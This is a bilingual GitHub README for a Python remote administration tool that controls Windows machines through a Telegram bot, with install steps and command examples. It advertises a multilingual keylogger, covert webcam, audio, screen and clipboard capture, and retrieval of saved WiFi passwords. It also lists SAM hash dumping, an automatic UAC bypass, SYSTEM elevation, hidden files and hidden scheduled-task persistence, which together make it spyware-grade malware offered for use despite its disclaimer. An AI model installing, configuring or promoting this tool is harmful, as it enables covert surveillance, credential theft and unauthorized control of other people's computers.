# 🤖 windows-telegram-bot


<div align="center">

[![Platform](https://img.shields.io/badge/platform-Windows-blue?logo=windows&logoColor=white)](https://www.microsoft.com/windows)
[![Language](https://img.shields.io/badge/language-Python%203-3776AB?logo=python)](https://www.python.org/)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)

*Advanced Telegram-based Remote Administration Tool for Windows*

</div>

---

## ⚠️ Legal Disclaimer

**This software is intended for educational purposes and authorized system administration only.**

- ✅ **Allowed use**: Managing your own devices, penetration testing with explicit written consent, educational research
- ❌ **Prohibited use**: Unauthorized access to computer systems, violating privacy laws, any illegal activities

**The author assumes no responsibility for misuse of this software.**

---

## 📖 Table of Contents | Оглавление

- [English](#english)
  - [📋 Overview](#-overview)
  - [✨ Features](#-features)
  - [🚀 Quick Start](#-quick-start)
  - [📁 File Structure](#-file-structure)
  - [🔐 Security & Encryption](#-security--encryption)
  - [📚 Command Reference](#-command-reference)
  - [⚙️ Configuration](#️-configuration)
  - [🛡️ Persistence Mechanisms](#️-persistence-mechanisms)

- [Русский](#русский)
  - [📋 Обзор](#-обзор)
  - [✨ Возможности](#-возможности)
  - [🚀 Быстрый старт](#-быстрый-старт)
  - [📁 Структура файлов](#-структура-файлов)
  - [🔐 Безопасность и шифрование](#-безопасность-и-шифрование)
  - [📚 Справочник команд](#-справочник-команд)
  - [⚙️ Конфигурация](#️-конфигурация)
  - [🛡️ Механизмы персистентности](#️-механизмы-персистентности)

---

# English

## 📋 Overview

**Windows Telegram Bot** is a comprehensive remote administration tool that provides **full system control** through Telegram messenger.

### Key Capabilities

| Category | Capabilities |
|----------|-------------|
| **System Control** | Reboot, shutdown, hibernate, sleep, logout, process management |
| **File System** | Browse, upload, download, create, delete, hide, unhide, zip |
| **Network** | IP config, route table, ARP cache, netstat, WiFi scanning/passwords |
| **Registry** | Full registry access (create, read, write, delete, enum keys/values) |
| **Group Policy** | Local Group Policy management (machine/user policies) |
| **Services & Tasks** | Windows services and Task Scheduler management |
| **Device Manager** | Device enumeration, driver install/delete, enable/disable/restart |
| **User Interface** | Screenshot, webcam capture, audio recording, mouse/keyboard control |
| **Surveillance** | Keylogger (multilingual EN/RU/UA), clipboard monitoring |
| **Persistence** | Services, tasks, startup (registry/folder), environment variables |
| **Security** | User management, app blocking, website blocking, hash dump (SAM/SECURITY) |
| **Information** | Full systeminfo (CPU, GPU, RAM, disks, battery, BIOS, etc.) |

## ✨ Features

### Core Features

| Feature | Description |
|---------|-------------|
| 🔐 **Password Protection** | SHA256 password hash verification |
| 🔑 **Session Management** | Encrypted user sessions with auto-cleanup |
| 🛡️ **Admin Elevation** | Automatic UAC bypass via ShellExecute |
| 🔄 **Self-Healing** | Auto-recovery from crashes, file corruption |
| 🎨 **Colored Output** | Formatted tables via `tabulate` |
| 📄 **File Transfer** | Upload/download any file size |
| 🔒 **Encrypted Storage** | XOR-based encryption for all sensitive data |

### System Commands

| Command | Description |
|---------|-------------|
| `systeminfo` | Full hardware/software inventory |
| `dxdiag` | DirectX diagnostic information |
| `device` | Device Manager control |
| `reg` | Registry editor (create/read/write/delete/enum) |
| `gpedit` | Local Group Policy editor |
| `service` | Windows services management |
| `task` | Task Scheduler management |
| `startup` | Startup items management |
| `app` | Installed applications management |
| `env` | Environment variables (machine/user/volatile) |
| `lang` | System language management |
| `user` | User account management |
| `ps` | Process list with CPU/MEM usage |
| `kill` | Terminate processes |
| `run` | Launch applications/files |
| `cmd` / `powershell` | Execute commands |
| `eventlog` | Windows Event Log viewer |
| `time` / `date` | Get/set system time/date |
| `logout` / `hibernate` / `sleep` / `reboot` / `shutdown` | Power management |

### Registry Commands

```bash
# Create key
reg -c HKEY_LOCAL_MACHINE\SOFTWARE\MyApp -n Settings

# Create value
reg -c HKEY_LOCAL_MACHINE\SOFTWARE\MyApp -n Version -v "1.0" -t sz

# Get value
reg -g HKEY_LOCAL_MACHINE\SOFTWARE\MyApp -n Version

# Enum keys
reg -e -k HKEY_LOCAL_MACHINE\SOFTWARE

# Delete
reg -d -v HKEY_LOCAL_MACHINE\SOFTWARE\MyApp -n Version
```

### Device Manager Commands

```bash
# List all devices
device -g

# Query device
device -q "PCI\VEN_8086"

# Install driver
device -i driver "C:\driver.inf"

# Enable/disable/restart
device -e "PCI\VEN_8086"
device -d "PCI\VEN_8086"
device -r "PCI\VEN_8086"

# Delete device/driver
device -s device "PCI\VEN_8086"
device -s driver "oem0.inf"

# Change device info (spoofing)
device -c device_name "PCI\VEN_8086" -n "New Name"
device -c bios_vendor -n "Custom BIOS"
```

### User Interface Commands

| Command | Description |
|---------|-------------|
| `screen` | Screenshot (PNG) / Wallpaper / Screen on/off |
| `webcam` | Webcam capture |
| `audio` | Record/play audio |
| `img` | Display image |
| `mouse` | Move, click, scroll, cursor customization |
| `keyboard` | Type, press keys, remap, block, layout switch |
| `clipboard` | Read/write/clear clipboard |
| `msg` | Display notifications/message boxes |
| `keylogger` | Enable/disable/retrieve keystrokes (EN/RU/UA) |

### Keylogger Features

- **Multilingual**: Supports English, Russian, Ukrainian layouts
- **Smart Parsing**: Handles Ctrl+Arrow word jumps, Backspace/Delete
- **Output Modes**:
  - `base` - Raw with hotkey tags
  - `char` - Characters only
  - `hotkey` - With hotkey tags
  - `no hotkey` - Without hotkey tags

## 🚀 Quick Start

### 📋 Prerequisites

- Windows 7/8/10/11
- Python 3.8+
- Administrator rights

### 📥 Installation

```bash
git clone https://github.com/vk-candpython/windows-telegram-bot.git
cd windows-telegram-bot
pip install -r requirements.txt
```

### ⚙️ Configuration

Edit `bot.py` and set:

```python
#-------------------------|NECESSARILY|-------------------------#
TOKEN = "YOUR_BOT_TOKEN"           # From @BotFather
PASSWORD = "YOUR_PASSWORD_HASH"    # SHA256 of your password
SEED = 12345                       # Random seed for encryption
PATH = "C:\\ProgramData\\MyBot"    # Installation directory
#-----------------------------|END|-----------------------------#

#-------------------------|OPTIONAL|-------------------------#
BOT_TASK_NAME = "MyBot"            # Task Scheduler name
BOT_TASK_DESCRIPTION = "My Bot"    # Task description
BOT_EXE = True                     # Run as persistent task
#----------------------------|END|---------------------------#
```

### 🔐 Generate Password Hash

```bash
python -c "from hashlib import sha256; print(sha256('YOUR_PASSWORD'.encode()).hexdigest())"
```

### 🏃 Run

```bash
# As Administrator
python bot.py
```

## 📁 File Structure

```
C:\ProgramData\MyBot\               # PATH (hidden)
├── bot.py                          # Main script
├── mem/                            # Session storage
│   └── {encrypted_user_id}         # One file per verified user
├── sys/                            # System files
│   ├── config/                     # Encrypted configs
│   │   ├── 0x66f4777938a79111      # TOKEN (encrypted)
│   │   ├── 0x7dc0a72554c7035d      # PASSWORD (encrypted)
│   │   └── 0x6e17263f779dce5a      # SEED
│   ├── 0x3b8f1289273df19c          # Restart flag
│   ├── 0x79f2d2686b6da01e          # Autostart entries (encrypted)
│   └── 0x2a47be6d04a14df5          # Keylogger flag
├── tmp/                            # Temporary files
│   ├── 0x1f95051e7493c896          # Blocked apps list
│   └── 0x4b0944084a778666          # Keylogger data
└── share/                          # Uploaded/downloaded files
```

## 🔐 Security & Encryption

**Properties:**
- XOR-based stream cipher with feedback
- Each encrypted byte depends on position, key, and previous state
- Used for: TOKEN, PASSWORD, autostart entries, sessions, keylogger data

## 📚 Command Reference

### Core Commands

| Command | Description |
|---------|-------------|
| `help` | Show all commands |
| `session` | Session information |
| `getpid` | Current PID |
| `getuid` | Current user |
| `getsystem` | Get SYSTEM rights |
| `restart` | Restart bot |
| `exit` | Log out |

### File System Examples

```bash
# List directory
ls

# Change directory
cd C:\Users

# Create file
mkfile test.txt -d "Hello\tWorld\n"

# Hide file
hide secret.txt

# Download file
cat document.pdf

# Zip current directory
zip
```

### Network Examples

```bash
# Get IP info
ipconfig

# Scan WiFi
wifi -g

# Get saved WiFi passwords
wifi -p

# Block website
site -b example.com
```

### Registry Examples

```bash
# Create key
reg -c HKEY_CURRENT_USER\Software\MyApp -n Settings

# Set value
reg -c HKEY_CURRENT_USER\Software\MyApp -n Version -v "1.0" -t sz

# Get value
reg -g HKEY_CURRENT_USER\Software\MyApp -n Version

# Enum values
reg -e -v HKEY_CURRENT_USER\Software\MyApp
```

### Service Examples

```bash
# List services
service -g

# Create service
service -c MyService -n "My Service" -d "Description" -p C:\app.exe -a "arg1 arg2" -m autostart

# Start/stop
service -l MyService
service -s MyService
```

### Task Scheduler Examples

```bash
# List tasks
task -g

# Create task (run at startup)
task -c system MyTask -d "Description" -p C:\script.bat -a none -h true -e startup

# Create task (run every minute)
task -c user MyTask -d "Description" -p C:\script.bat -a none -h true -e time
```

### User Interface Examples

```bash
# Screenshot
screen -s

# Webcam
webcam

# Record 10 seconds
audio 10

# Move mouse
mouse -x 500 -y 300 -d 1

# Type text
keyboard -t "Hello" -d 1

# Set keyboard layout to Russian
keyboard -s ru

# Get clipboard
clipboard -g

# Show notification
msg -p "Title" -t "Message"
```

### Keylogger Examples

```bash
# Enable
keylogger -e

# Status
keylogger -s

# Get data (raw)
keylogger -g base

# Get data (characters only)
keylogger -g char

# Disable
keylogger -d
```

## ⚙️ Configuration

### Runtime Config Changes

```bash
# View config
config -g

# Change TOKEN
config TOKEN -s 1234567890:ABCdefGHIjklMNOpqrsTUVwxyz

# Change PASSWORD
config PASSWORD -s newpassword

# Reset TOKEN
config -r TOKEN
```

## 🛡️ Persistence Mechanisms

### 1. Task Scheduler (BOT_EXE=True)

Creates task that runs every minute:
- User: SYSTEM or current user
- Hidden: true
- Priority: highest
- Restarts if failed

### 2. Internal Autostart

```bash
autostart -c name -p C:\app.exe -a "args" -w true
autostart -l
autostart -d name
```

### 3. Windows Startup (Registry)

```bash
startup -c machine MyApp -p C:\app.exe -a none
startup -g
startup -d machine MyApp
```

### 4. Windows Services

```bash
service -c MyService -n "Display" -d "Desc" -p C:\app.exe -a none -m autostart
```

---

# Русский

## 📋 Обзор

**Windows Telegram Bot** — это комплексный инструмент удалённого администрирования, предоставляющий **полный контроль над системой** Windows через мессенджер Telegram.

### Ключевые возможности

| Категория | Возможности |
|-----------|-------------|
| **Управление системой** | Перезагрузка, выключение, гибернация, сон, выход, управление процессами |
| **Файловая система** | Навигация, загрузка, скачивание, создание, удаление, скрытие, архивация |
| **Сеть** | IP-конфигурация, таблицы маршрутизации, ARP-кэш, netstat, WiFi |
| **Реестр** | Полный доступ к реестру (создание, чтение, запись, удаление, перечисление) |
| **Групповые политики** | Управление локальными политиками (machine/user) |
| **Службы и задачи** | Управление службами Windows и Планировщиком задач |
| **Диспетчер устройств** | Перечисление устройств, установка/удаление драйверов, вкл/выкл/перезапуск |
| **Интерфейс** | Скриншоты, веб-камера, запись звука, мышь/клавиатура |
| **Наблюдение** | Кейлоггер (многоязычный EN/RU/UA), мониторинг буфера обмена |
| **Персистентность** | Службы, задачи, автозагрузка, переменные окружения |
| **Безопасность** | Управление пользователями, блокировка приложений/сайтов, дамп хешей |

## ✨ Возможности

### Основные возможности

| Возможность | Описание |
|-------------|----------|
| 🔐 **Защита паролем** | Проверка SHA256 хеша пароля |
| 🔑 **Управление сессиями** | Зашифрованные файлы сессий |
| 🛡️ **Повышение прав** | Автоматический UAC bypass через ShellExecute |
| 🔄 **Самовосстановление** | Автовосстановление после сбоев |
| 🔒 **Шифрованное хранение** | XOR-шифрование чувствительных данных |

## 🚀 Быстрый старт

### 📋 Требования

- Windows 7/8/10/11
- Python 3.8+
- Права администратора

### 📥 Установка

```bash
git clone https://github.com/vk-candpython/windows-telegram-bot.git
cd windows-telegram-bot
pip install -r requirements.txt
```

### ⚙️ Конфигурация

Отредактируй `bot.py`:

```python
TOKEN = "ТВОЙ_ТОКЕН_БОТА"           # От @BotFather
PASSWORD = "ХЕШ_ПАРОЛЯ"             # SHA256 твоего пароля
SEED = 12345                        # Зерно для шифрования
PATH = "C:\\ProgramData\\MyBot"     # Директория установки
```

### 🏃 Запуск

```bash
python bot.py
```

## 📚 Справочник команд

### Реестр

```bash
# Создать ключ
reg -c HKEY_CURRENT_USER\Software\MyApp -n Settings

# Установить значение
reg -c HKEY_CURRENT_USER\Software\MyApp -n Version -v "1.0" -t sz

# Получить значение
reg -g HKEY_CURRENT_USER\Software\MyApp -n Version

# Удалить
reg -d -v HKEY_CURRENT_USER\Software\MyApp -n Version
```

### Устройства

```bash
# Список устройств
device -g

# Информация об устройстве
device -q "PCI\VEN_8086"

# Включить/выключить
device -e "PCI\VEN_8086"
device -d "PCI\VEN_8086"

# Изменить информацию (спуфинг)
device -c device_name "PCI\VEN_8086" -n "Новое имя"
```

### Кейлоггер

```bash
# Включить
keylogger -e

# Статус
keylogger -s

# Получить данные (только символы)
keylogger -g char

# Выключить
keylogger -d
```

---

<div align="center">

**[⬆ Back to Top](#-windows-telegram-bot)**

*Remote Administration via Telegram — Full Windows Control*

</div>
